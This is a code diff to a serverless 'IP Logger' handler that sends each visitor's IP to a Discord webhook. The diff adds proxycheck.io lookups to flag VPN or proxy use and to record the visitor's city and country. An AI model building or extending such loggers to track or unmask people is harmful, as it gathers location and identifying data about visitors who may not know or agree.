@@ -36,16 +36,70 @@ module.exports = async (req, res) => {
       return res.status(200).json({ success: false, message: 'Webhook not configured' });
     }
 
+    // Check for VPN/Proxy using ProxyCheck.io
+    let vpnStatus = '❓ Unknown';
+    let vpnColor = 0x5865F2; // Default Discord Blurple
+    let locationInfo = 'Unknown';
+    
+    try {
+      if (ip !== 'Unknown') {
+        const proxyCheckKey = process.env.PROXYCHECK_API_KEY || '';
+        const proxyCheckUrl = proxyCheckKey 
+          ? `https://proxycheck.io/v2/${ip}?key=${proxyCheckKey}&vpn=1&asn=1`
+          : `https://proxycheck.io/v2/${ip}?vpn=1&asn=1`;
+        
+        const vpnCheck = await axios.get(proxyCheckUrl, { timeout: 3000 });
+        
+        if (vpnCheck.data && vpnCheck.data[ip]) {
+          const ipData = vpnCheck.data[ip];
+          
+          // Determine VPN/Proxy status
+          if (ipData.proxy === 'yes') {
+            vpnStatus = '🚨 VPN/Proxy Detected';
+            vpnColor = 0xFF0000; // Red
+            
+            // Get proxy type if available
+            const proxyType = ipData.type || 'Unknown';
+            vpnStatus += ` (${proxyType})`;
+          } else {
+            vpnStatus = '✅ Clean IP';
+            vpnColor = 0x00FF00; // Green
+          }
+          
+          // Get location info
+          if (ipData.country || ipData.city) {
+            locationInfo = `${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}`;
+            if (ipData.isocode) {
+              locationInfo += ` (${ipData.isocode})`;
+            }
+          }
+        }
+      }
+    } catch (vpnError) {
+      console.error('VPN check error:', vpnError.message);
+      vpnStatus = '⚠️ Check Failed';
+    }
+
     // Create Discord embed message
     const discordMessage = {
       embeds: [{
         title: '🌐 New Visitor Logged',
-        color: 0x5865F2, // Discord Blurple
+        color: vpnColor,
         fields: [
           {
             name: '📍 IP Address',
             value: `\`${ip}\``,
             inline: true
+          },
+          {
+            name: '🔒 VPN Status',
+            value: vpnStatus,
+            inline: true
+          },
+          {
+            name: '🌍 Location',
+            value: `\`${locationInfo}\``,
+            inline: false
           },
           {
             name: '🕐 Timestamp',
@@ -65,7 +119,7 @@ module.exports = async (req, res) => {
         ],
         timestamp: timestamp,
         footer: {
-          text: 'IP Logger'
+          text: 'IP Logger with VPN Detection'
         }
       }]
     };
